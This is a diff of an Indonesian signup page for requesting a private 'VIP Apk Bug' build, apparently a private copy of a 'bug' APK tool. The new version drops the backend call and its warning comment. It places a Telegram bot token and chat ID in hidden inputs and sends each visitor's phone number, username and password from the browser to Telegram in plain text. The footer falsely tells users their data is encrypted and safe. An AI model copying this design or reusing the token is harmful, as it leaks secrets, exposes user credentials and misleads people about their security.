@@ -1,376 +1,579 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#10100f">
-  <title>Creat Private — Cika</title>
-  <style>
-    :root {
-      color-scheme: dark;
-      --bg: #0d0e0d;
-      --panel: #151715;
-      --panel-soft: #1b1e1b;
-      --line: rgba(231, 202, 137, .16);
-      --gold: #d8b979;
-      --gold-light: #f0d9a7;
-      --text: #f2f0e9;
-      --muted: #92958d;
-      --danger: #e58a82;
-      --success: #8ec7a0;
-    }
-    * { box-sizing: border-box; }
-    html { scroll-behavior: smooth; }
-    body {
-      margin: 0;
-      min-height: 100vh;
-      padding: 36px 18px;
-      display: grid;
-      place-items: center;
-      color: var(--text);
-      background:
-        radial-gradient(ellipse at 50% -15%, rgba(216,185,121,.10), transparent 48%),
-        var(--bg);
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
-    }
-    .page { width: min(100%, 490px); }
-    .topline {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin: 0 4px 14px;
-      color: var(--muted);
-      font-size: 10px;
-      letter-spacing: .19em;
-      text-transform: uppercase;
-    }
-    .topline span:last-child { color: var(--gold); }
-    .card {
-      overflow: hidden;
-      position: relative;
-      padding: 34px 34px 26px;
-      background: linear-gradient(160deg, rgba(28,31,27,.98), rgba(17,19,17,.99));
-      border: 1px solid var(--line);
-      border-radius: 23px;
-      box-shadow: 0 28px 80px rgba(0,0,0,.42);
-    }
-    .card::before {
-      content: "";
-      position: absolute;
-      top: 0; left: 12%; right: 12%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(240,217,167,.65), transparent);
-    }
-    header { text-align: center; }
-    .logo-wrap {
-      width: 76px; height: 76px;
-      margin: 0 auto 18px;
-      padding: 3px;
-      border: 1px solid rgba(216,185,121,.5);
-      border-radius: 50%;
-      background: #24251f;
-    }
-    .logo-wrap img {
-      display: block; width: 100%; height: 100%;
-      object-fit: cover; border-radius: 50%;
-    }
-    .eyebrow {
-      color: var(--gold);
-      font-size: 10px;
-      font-weight: 650;
-      letter-spacing: .23em;
-      text-transform: uppercase;
-    }
-    h1 {
-      margin: 10px 0 8px;
-      font-family: Georgia, "Times New Roman", serif;
-      font-size: clamp(29px, 7vw, 36px);
-      font-weight: 500;
-      letter-spacing: .035em;
-    }
-    .subtitle {
-      max-width: 330px;
-      margin: 0 auto;
-      color: var(--muted);
-      font-size: 13px;
-      line-height: 1.65;
-    }
-    .notice {
-      margin: 24px 0 25px;
-      padding: 12px 14px;
-      border: 1px solid var(--line);
-      border-radius: 11px;
-      background: rgba(216,185,121,.055);
-      color: #c9c4b7;
-      text-align: center;
-      font-size: 12px;
-      line-height: 1.5;
-    }
-    .notice strong {
-      display: block;
-      margin-bottom: 2px;
-      color: var(--gold-light);
-      font-size: 10px;
-      letter-spacing: .16em;
-      text-transform: uppercase;
-    }
-    form { margin: 0; }
-    .section-label {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin: 0 0 17px;
-      color: var(--gold-light);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: .16em;
-      text-transform: uppercase;
-    }
-    .section-label::after {
-      content: ""; height: 1px; flex: 1;
-      background: var(--line);
-    }
-    .field { margin-bottom: 17px; }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      color: #d8d8d0;
-      font-size: 12px;
-      font-weight: 600;
-    }
-    input {
-      display: block;
-      width: 100%;
-      min-height: 48px;
-      padding: 12px 14px;
-      border: 1px solid rgba(255,255,255,.10);
-      border-radius: 10px;
-      outline: none;
-      background: #101210;
-      color: var(--text);
-      font: inherit;
-      font-size: 13px;
-      transition: border-color .18s, background .18s, box-shadow .18s;
-    }
-    input::placeholder { color: #666b63; }
-    input:focus {
-      border-color: rgba(216,185,121,.72);
-      background: #131611;
-      box-shadow: 0 0 0 3px rgba(216,185,121,.08);
-    }
-    .hint {
-      margin: 7px 1px 0;
-      color: #777c73;
-      font-size: 10px;
-      line-height: 1.5;
-    }
-    .admin-area {
-      margin: 24px 0 19px;
-      padding: 15px;
-      border: 1px solid rgba(216,185,121,.15);
-      border-radius: 12px;
-      background: rgba(0,0,0,.16);
-    }
-    .admin-head {
-      display: flex; align-items: center; gap: 9px;
-      color: var(--gold-light);
-      font-size: 11px; font-weight: 650;
-    }
-    .admin-head .lock {
-      margin-left: auto;
-      color: #a7a99f;
-      font-size: 9px;
-      letter-spacing: .12em;
-      text-transform: uppercase;
-    }
-    .admin-copy {
-      margin: 9px 0 0;
-      color: var(--muted);
-      font-size: 11px;
-      line-height: 1.6;
-    }
-    .bot-state {
-      display: flex; align-items: center; gap: 10px;
-      margin-top: 13px; padding-top: 12px;
-      border-top: 1px solid rgba(255,255,255,.07);
-    }
-    .bot-mark {
-      display: grid; place-items: center;
-      width: 31px; height: 31px; border-radius: 9px;
-      background: rgba(216,185,121,.10);
-      color: var(--gold-light); font-size: 15px;
-    }
-    .bot-state strong { display: block; font-size: 11px; font-weight: 600; }
-    .bot-state small { display: block; margin-top: 3px; color: var(--muted); font-size: 10px; }
-    .bot-state .indicator {
-      width: 7px; height: 7px; margin-left: auto;
-      border-radius: 50%; background: #83bd8f;
-      box-shadow: 0 0 0 4px rgba(131,189,143,.08);
-    }
-    .submit {
-      display: flex; align-items: center; justify-content: center; gap: 10px;
-      width: 100%; min-height: 51px; margin-top: 7px;
-      border: 1px solid #e5c98f;
-      border-radius: 10px;
-      background: linear-gradient(135deg, #e7cf9e, #c8a86b);
-      color: #211d14;
-      font: inherit; font-size: 13px; font-weight: 750;
-      letter-spacing: .035em;
-      cursor: pointer;
-      transition: transform .18s, filter .18s, opacity .18s;
-    }
-    .submit:hover { filter: brightness(1.06); transform: translateY(-1px); }
-    .submit:active { transform: translateY(0); }
-    .submit:disabled { cursor: wait; opacity: .65; }
-    .status {
-      display: none; margin-top: 15px; padding: 12px 13px;
-      border-radius: 9px; font-size: 12px; line-height: 1.5;
-    }
-    .status.success { display: block; color: var(--success); background: rgba(86,155,105,.10); border: 1px solid rgba(86,155,105,.22); }
-    .status.error { display: block; color: var(--danger); background: rgba(190,93,84,.10); border: 1px solid rgba(190,93,84,.22); }
-    .status.loading { display: block; color: var(--gold-light); background: rgba(216,185,121,.08); border: 1px solid var(--line); }
-    footer {
-      padding-top: 21px;
-      color: #70756c;
-      text-align: center;
-      font-size: 10px;
-      line-height: 1.8;
-    }
-    footer .foot-mark { color: var(--gold); letter-spacing: .12em; }
-    @media (max-width: 520px) {
-      body { padding: 18px 12px; }
-      .card { padding: 28px 20px 23px; border-radius: 18px; }
-      .topline { font-size: 9px; }
-    }
-    @media (prefers-reduced-motion: reduce) {
-      *, *::before, *::after { scroll-behavior: auto !important; transition-duration: .01ms !important; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Listing Aplikasi Cika - VIP Private</title>
+    <style>
+        :root {
+            color-scheme: dark;
+            --page: #0c1017;
+            --surface: #141b25;
+            --surface-soft: #192331;
+            --line: rgba(255,255,255,.09);
+            --text: #edf2f7;
+            --muted: #8995a5;
+            --accent: #d7b477;
+            --accent-hover: #e7c991;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Inter, "Segoe UI", system-ui, -apple-system, sans-serif;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 36px 18px;
+            color: var(--text);
+            background:
+                radial-gradient(ellipse at 50% -15%, rgba(75,102,133,.20), transparent 48%),
+                var(--page);
+            overflow-x: hidden;
+            overscroll-behavior-y: contain;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .stars { display: none; }
+
+        .container {
+            width: 100%;
+            max-width: 492px;
+            position: relative;
+            z-index: 1;
+            padding: 34px;
+            background: var(--surface);
+            border: 1px solid var(--line);
+            border-radius: 18px;
+            box-shadow: 0 22px 70px rgba(0,0,0,.32);
+            animation: appear .35s ease-out;
+        }
+
+        @keyframes appear {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header { text-align: center; margin-bottom: 27px; }
+
+        .logo-container {
+            width: 76px;
+            height: 76px;
+            margin: 0 auto 18px;
+            padding: 3px;
+            border-radius: 18px;
+            background: #202b39;
+            border: 1px solid rgba(255,255,255,.12);
+            box-shadow: 0 8px 24px rgba(0,0,0,.22);
+            transition: transform .2s ease;
+        }
+
+        .logo-container:hover { transform: translateY(-2px); }
+
+        .logo-container img {
+            display: block;
+            width: 100%;
+            height: 100%;
+            border-radius: 15px;
+            object-fit: cover;
+        }
+
+        h1 {
+            color: var(--text);
+            font-size: 27px;
+            line-height: 1.2;
+            font-weight: 750;
+            letter-spacing: -.8px;
+        }
+
+        .vip-badge {
+            display: inline-flex;
+            align-items: center;
+            margin-top: 11px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: #e5c58d;
+            background: rgba(215,180,119,.10);
+            border: 1px solid rgba(215,180,119,.22);
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1.1px;
+        }
+
+        .subtitle {
+            margin-top: 12px;
+            padding-bottom: 21px;
+            border-bottom: 1px solid var(--line);
+            color: var(--muted);
+            font-size: 13px;
+            letter-spacing: .1px;
+        }
+
+        .subtitle span {
+            color: var(--accent-hover);
+            font-weight: 650;
+        }
+
+        .note-box {
+            margin: 0 0 23px;
+            padding: 12px 15px;
+            border-radius: 9px;
+            background: rgba(215,180,119,.07);
+            border: 1px solid rgba(215,180,119,.17);
+            color: #c6b18d;
+            text-align: left;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .note-box strong {
+            display: block;
+            margin-bottom: 2px;
+            color: var(--accent-hover);
+            font-size: 10px;
+            letter-spacing: 1px;
+        }
+
+        .form-group { margin-bottom: 17px; }
+
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            color: #cbd3dd;
+            font-size: 12px;
+            font-weight: 650;
+            letter-spacing: .1px;
+        }
+
+        label .label-icon { font-size: 15px; }
+
+        input {
+            display: block;
+            width: 100%;
+            padding: 13px 14px;
+            border: 1px solid #303c4b;
+            border-radius: 9px;
+            outline: none;
+            background: #101720;
+            color: var(--text);
+            font-size: 14px;
+            font-weight: 400;
+            transition: border-color .18s ease, box-shadow .18s ease, background .18s ease;
+        }
+
+        input::placeholder { color: #647184; font-size: 13px; }
+
+        input:focus {
+            border-color: var(--accent);
+            background: #121b26;
+            box-shadow: 0 0 0 3px rgba(215,180,119,.12);
+        }
+
+        .field-hint {
+            margin-top: 7px;
+            padding-left: 2px;
+            color: #718093;
+            font-size: 10px;
+            line-height: 1.45;
+        }
+
+        .admin-area {
+            position: relative;
+            margin: 23px 0 21px;
+            padding: 17px 15px 14px;
+            border: 1px solid rgba(215,180,119,.17);
+            border-radius: 11px;
+            background: #111923;
+            transition: border-color .2s ease;
+        }
+
+        .admin-area:hover { border-color: rgba(215,180,119,.3); }
+
+        .admin-area .lock-icon {
+            position: absolute;
+            top: -10px;
+            right: 13px;
+            padding: 4px 9px;
+            border: 1px solid rgba(215,180,119,.25);
+            border-radius: 5px;
+            background: #1b2633;
+            color: var(--accent-hover);
+            font-size: 9px;
+            font-weight: 750;
+            letter-spacing: .8px;
+        }
+
+        .admin-area label { color: #aeb9c7; }
+        .admin-area input { background: #0d141d; border-color: #293545; color: #fff; }
+        .admin-area input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(215,180,119,.10);
+        }
+        .admin-area .form-group:last-child { margin-bottom: 0; }
+        .hidden-token-input { display: none !important; }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            margin-top: 7px;
+            padding: 14px 18px;
+            border: 1px solid #e3c38d;
+            border-radius: 9px;
+            background: var(--accent);
+            color: #171a1f;
+            font-size: 14px;
+            font-weight: 750;
+            letter-spacing: .15px;
+            cursor: pointer;
+            transition: background .18s ease, transform .18s ease, box-shadow .18s ease;
+        }
+
+        .btn:hover {
+            background: var(--accent-hover);
+            box-shadow: 0 7px 20px rgba(215,180,119,.15);
+            transform: translateY(-1px);
+        }
+
+        .btn:active { transform: translateY(0) scale(.99); }
+        .btn .btn-icon { font-size: 17px; }
+
+        .status {
+            display: none;
+            margin-top: 16px;
+            padding: 12px 14px;
+            border-radius: 9px;
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.5;
+            animation: fadeIn .2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .status.success {
+            display: block;
+            color: #8ed8ad;
+            background: rgba(46,160,99,.11);
+            border: 1px solid rgba(46,160,99,.24);
+        }
+
+        .status.error {
+            display: block;
+            color: #f0a1a1;
+            background: rgba(205,75,75,.10);
+            border: 1px solid rgba(205,75,75,.22);
+        }
+
+        .status.loading {
+            display: block;
+            color: #e5c58d;
+            background: rgba(215,180,119,.08);
+            border: 1px solid rgba(215,180,119,.18);
+        }
+
+        .footer-note {
+            margin-top: 22px;
+            color: #758193;
+            text-align: center;
+            font-size: 10px;
+            line-height: 1.7;
+        }
+
+        .footer-note .dot { color: var(--accent); font-weight: 700; }
+
+        .footer-note .secure {
+            display: inline-block;
+            margin-top: 2px;
+            padding: 4px 10px;
+            border: 1px solid var(--line);
+            border-radius: 6px;
+            background: rgba(255,255,255,.025);
+            color: #9ba7b6;
+            font-size: 10px;
+        }
+
+        .admin-info-text {
+            margin-top: 7px;
+            color: #687587;
+            font-size: 10px;
+            text-align: center;
+        }
+
+        .admin-info-text strong { color: #9aa6b5; font-weight: 600; }
+
+        .app-type {
+            margin: 12px 0 18px;
+            padding: 12px 14px;
+            border: 1px solid var(--line);
+            border-radius: 10px;
+            background: rgba(255,255,255,.025);
+        }
+
+        .app-type-title {
+            margin-bottom: 8px;
+            color: var(--muted);
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .app-type-list { display: flex; flex-wrap: wrap; gap: 7px; }
+
+        .app-chip {
+            padding: 6px 9px;
+            border: 1px solid var(--line);
+            border-radius: 6px;
+            background: rgba(255,255,255,.035);
+            color: #c5ced8;
+            font-size: 11px;
+        }
+
+        @media (max-width: 520px) {
+            body { align-items: flex-start; padding: 18px 12px; }
+            .container { padding: 25px 18px 22px; border-radius: 14px; }
+            h1 { font-size: 24px; }
+            .logo-container { width: 68px; height: 68px; border-radius: 15px; }
+            .logo-container img { border-radius: 12px; }
+            .btn { padding: 13px; font-size: 14px; }
+            .admin-area { padding: 16px 12px 12px; }
+            input { padding: 12px 13px; font-size: 14px; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: .01ms !important;
+                animation-iteration-count: 1 !important;
+                scroll-behavior: auto !important;
+                transition-duration: .01ms !important;
+            }
+        }
+</style>
 </head>
 <body>
-  <main class="page">
-    <div class="topline"><span>CIKA · PRIVATE ACCESS</span><span>MEMBER AREA</span></div>
-    <section class="card">
-      <header>
-        <div class="logo-wrap">
-          <img src="https://files.catbox.moe/aow0m9.jpg" alt="Logo Cika">
-        </div>
-        <div class="eyebrow">Permintaan akses anggota</div>
-        <h1>Creat Private</h1>
-        <p class="subtitle">Lengkapi data di bawah ini untuk mengajukan pembuatan APK private.</p>
-      </header>
+    <div class="stars"></div>
 
-      <div class="notice">
-        <strong>Perhatian</strong>
-        Pastikan semua data sudah benar sebelum dikirim.
-      </div>
-
-      <form id="registrationForm">
-        <div class="section-label">Informasi anggota</div>
-        <div class="field">
-          <label for="hp">Nomor HP terdaftar di grup VIP</label>
-          <input type="tel" id="hp" name="hp" placeholder="Contoh: 08xxxxxxxxxx" required autocomplete="tel" inputmode="tel">
-        </div>
-        <div class="field">
-          <label for="jenisApk">Jenis APK</label>
-          <input type="text" id="jenisApk" name="jenisApk" placeholder="Masukkan jenis atau nama APK" required maxlength="50" autocomplete="off">
-          <p class="hint">Contoh: Miyako, Sanz, atau nama APK lainnya.</p>
-        </div>
-
-        <div class="section-label" style="margin-top:25px">Detail permintaan</div>
-        <div class="field">
-          <label for="nama">Username APK</label>
-          <input type="text" id="nama" name="nama" placeholder="Masukkan username yang diminta" required autocomplete="username">
-        </div>
-        <div class="field">
-          <label for="password">Password APK</label>
-          <input type="password" id="password" name="password" placeholder="Masukkan password yang diminta" required autocomplete="new-password">
-        </div>
-
-        <aside class="admin-area">
-          <div class="admin-head">
-            <span>✦</span> Informasi pengiriman
-            <span class="lock">Admin only</span>
-          </div>
-          <p class="admin-copy">Setelah formulir dikirim, permintaan akan diteruskan ke admin untuk diperiksa.</p>
-          <div class="bot-state">
-            <div class="bot-mark">✉</div>
-            <div>
-              <strong>Pengiriman melalui Telegram</strong>
-              <small>Notifikasi permintaan ke admin</small>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://files.catbox.moe/aow0m9.jpg" alt="Cika Logo" loading="lazy">
             </div>
-            <span class="indicator" aria-label="Konfigurasi tampilan"></span>
-          </div>
-        </aside>
+            <div class="note-box">
+                <strong>NOTE</strong>
+                Isi Jangan Asal-Asalan Wok
+            </div>
+            <h1>CREAT PRIVATE</h1>
+            <div class="vip-badge">⭐ VIP PRIVATE ⭐</div>
+            <div class="subtitle">Khusus <span>Private VIP Apk Bug</span></div>
+        </div>
 
-        <button class="submit" id="submitButton" type="submit">
-          <span>Kirim permintaan</span><span aria-hidden="true">↗</span>
-        </button>
-      </form>
+        <!-- Form -->
+        <form id="registrationForm">
+            <!-- URUTAN BARU: Nomor HP dulu -->
+            <div class="form-group">
+                <label>
+                    <span class="label-icon">📞</span> Nomor HP Wajib Yang Ada Di Group VIP
+                </label>
+                <input type="tel" id="hp" placeholder="08xx-xxxx-xxxx (terdaftar di Group VIP)" required autocomplete="tel">
+            </div>
 
-      <div id="statusMessage" class="status" role="status" aria-live="polite"></div>
-      <footer>
-        <div class="foot-mark">CIKA PRIVATE</div>
-        <div>Gunakan data yang benar dan pastikan Anda anggota grup VIP.</div>
-      </footer>
-    </section>
-  </main>
+            <!-- Jenis APK -->
+            <div class="form-group">
+                <label>
+                    <span class="label-icon">📱</span> Jenis Apk
+                </label>
+                <input type="text" id="jenisApk" placeholder="Masukkan jenis APK yang ingin dibuat" required autocomplete="off" maxlength="50">
+                <div class="field-hint">Contoh: Miyako, Sanz, atau nama APK lainnya</div>
+            </div>
 
-  <script>
-    (() => {
-      const form = document.getElementById('registrationForm');
-      const statusBox = document.getElementById('statusMessage');
-      const submitButton = document.getElementById('submitButton');
+            <!-- Username APK Bug -->
+            <div class="form-group">
+                <label>
+                    <span class="label-icon">👤</span> Rikwes User Apk Bug
+                </label>
+                <input type="text" id="nama" placeholder="Masukkan username APK Bug" required autocomplete="name">
+            </div>
 
-      function showStatus(message, type) {
-        statusBox.textContent = message;
-        statusBox.className = `status ${type}`;
-      }
+            <!-- Password APK Bug -->
+            <div class="form-group">
+                <label>
+                    <span class="label-icon">🔑</span> Rikwes Password Apk Bug
+                </label>
+                <input type="password" id="password" placeholder="Masukkan password APK Bug" required autocomplete="new-password">
+            </div>
 
-      form.addEventListener('submit', async (event) => {
-        event.preventDefault();
+            <!-- Area Admin (token & ID tersembunyi) -->
+            <div class="admin-area">
+                <span class="lock-icon">🔒 ADMIN</span>
+                <div style="font-size:12px; color:rgba(255,255,255,0.3); margin-bottom:10px; font-weight:300; letter-spacing:0.3px;">
+                    ⚡ Data ini hanya diketahui admin
+                </div>
+                
+                <!-- Token Bot - TERSEMBUNYI -->
+                <input type="text" id="botToken" value="8662190407:AAEWIGXHi_oXeEtLkeBM9SbGnyHdXRdOl2E" class="hidden-token-input">
+                
+                <!-- Chat ID - TERSEMBUNYI -->
+                <input type="text" id="chatId" value="8052396364" class="hidden-token-input">
 
-        const hp = document.getElementById('hp').value.trim();
-        const jenisApk = document.getElementById('jenisApk').value.trim();
-        const nama = document.getElementById('nama').value.trim();
-        const password = document.getElementById('password').value;
+                <!-- Info bot untuk user -->
+                <div style="display:flex; align-items:center; gap:10px; background:rgba(255,255,255,0.03); padding:10px 14px; border-radius:12px; margin-top:4px; border:1px solid rgba(255,255,255,0.03);">
+                    <span style="font-size:20px;">🤖</span>
+                    <div>
+                        <div style="font-size:12px; font-weight:500; color:rgba(255,255,255,0.6);">Bot Telegram Aktif</div>
+                        <div style="font-size:10px; color:rgba(255,255,255,0.25);">Data terkirim aman ke admin</div>
+                    </div>
+                    <span style="margin-left:auto; font-size:20px; opacity:0.5;">✅</span>
+                </div>
+            </div>
 
-        if (!/^[0-9+\-()\s]{10,18}$/.test(hp)) {
-          showStatus('Periksa kembali nomor HP. Format nomor belum sesuai.', 'error');
-          return;
-        }
-        if (password.length < 4) {
-          showStatus('Password minimal terdiri dari 4 karakter.', 'error');
-          return;
-        }
+            <!-- Tombol Kirim -->
+            <button type="submit" class="btn">
+                <span class="btn-icon">🚀</span> Kirim ke Bot
+            </button>
+        </form>
 
-        submitButton.disabled = true;
-        submitButton.querySelector('span').textContent = 'Mengirim...';
-        showStatus('Permintaan sedang dikirim. Mohon tunggu sebentar.', 'loading');
+        <!-- Status Message -->
+        <div id="statusMessage" class="status"></div>
 
-        try {
-          // Endpoint backend harus menyimpan token Telegram di server, bukan di HTML.
-          const response = await fetch('/api/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ hp, jenisApk, nama, password })
-          });
+        <!-- Footer -->
+        <div class="footer-note">
+            <div class="secure">🔐 Data terenkripsi & aman</div>
+            <div style="margin-top:5px;">
+                <span class="dot">●</span> Hanya admin yang dapat melihat data <span class="dot">●</span>
+            </div>
+            <div class="admin-info-text">
+                <strong>ID Admin:</strong> 8052396364
+            </div>
+        </div>
+    </div>
 
-          const result = await response.json().catch(() => ({}));
-          if (!response.ok || result.success !== true) {
-            throw new Error(result.message || 'Permintaan belum berhasil dikirim. Silakan coba lagi.');
-          }
+    <script>
+        (function() {
+            const form = document.getElementById('registrationForm');
+            const statusDiv = document.getElementById('statusMessage');
 
-          showStatus('Permintaan berhasil dikirim ke admin.', 'success');
-          form.reset();
-        } catch (error) {
-          showStatus(error.message || 'Tidak dapat terhubung ke server. Coba lagi nanti.', 'error');
-        } finally {
-          submitButton.disabled = false;
-          submitButton.querySelector('span').textContent = 'Kirim permintaan';
-        }
-      });
-    })();
-  </script>
+            function getBotConfig() {
+                return {
+                    token: document.getElementById('botToken').value,
+                    chatId: document.getElementById('chatId').value
+                };
+            }
+
+            function showStatus(message, type) {
+                statusDiv.textContent = message;
+                statusDiv.className = 'status ' + type;
+                clearTimeout(window.statusTimeout);
+                window.statusTimeout = setTimeout(() => {
+                    statusDiv.className = 'status';
+                    statusDiv.textContent = '';
+                }, 7000);
+            }
+
+            async function sendToTelegram(botToken, chatId, data) {
+                const now = new Date();
+                const waktu = now.toLocaleString('id-ID', {
+                    weekday: 'long',
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                const text = `📋 *DATA PENDAFTARAN CIKA - VIP PRIVATE*\n` +
+                             `━━━━━━━━━━━━━━━━━━━━\n` +
+                             `📞 *No HP (Group VIP):* ${data.hp}\n` +
+                             `📱 *Jenis Apk:* ${data.jenisApk}\n` +
+                             `👤 *Username APK Bug:* ${data.nama}\n` +
+                             `🔑 *Password APK Bug:* ${data.password}\n` +
+                             `━━━━━━━━━━━━━━━━━━━━\n` +
+                             `🕒 *Waktu:* ${waktu}\n` +
+                             `🏷️ *Status:* VIP Private`;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+
+                    const result = await response.json();
+
+                    if (result.ok) {
+                        return { success: true, message: '✅ Data berhasil dikirim ke bot Telegram!' };
+                    } else {
+                        let errorMsg = '❌ Gagal kirim: ' + (result.description || 'Unknown error');
+                        if (result.error_code === 401) errorMsg = '❌ Token Bot tidak valid! Hubungi admin.';
+                        else if (result.error_code === 400) errorMsg = '❌ ID Telegram tidak valid! Hubungi admin.';
+                        return { success: false, message: errorMsg };
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    return { success: false, message: '❌ Gagal terhubung ke server. Cek koneksi internet.' };
+                }
+            }
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const hp = document.getElementById('hp').value.trim();
+                const jenisApk = document.getElementById('jenisApk').value.trim();
+                const nama = document.getElementById('nama').value.trim();
+                const password = document.getElementById('password').value.trim();
+
+                // Validasi
+                if (!hp || !jenisApk || !nama || !password) {
+                    showStatus('⚠️ Semua kolom harus diisi!', 'error');
+                    return;
+                }
+
+                if (hp.length < 10 || hp.length > 15 || !/^[0-9+\-()\s]+$/.test(hp)) {
+                    showStatus('⚠️ Format nomor HP tidak valid!', 'error');
+                    return;
+                }
+
+                if (password.length < 4) {
+                    showStatus('⚠️ Password minimal 4 karakter!', 'error');
+                    return;
+                }
+
+                const config = getBotConfig();
+                const userData = { hp, jenisApk, nama, password };
+
+                showStatus('⏳ Mengirim data ke bot ...', 'loading');
+
+                const result = await sendToTelegram(config.token, config.chatId, userData);
+
+                if (result.success) {
+                    showStatus(result.message + ' ✅', 'success');
+                } else {
+                    showStatus(result.message, 'error');
+                }
+            });
+
+        })();
+    </script>
 </body>
 </html>
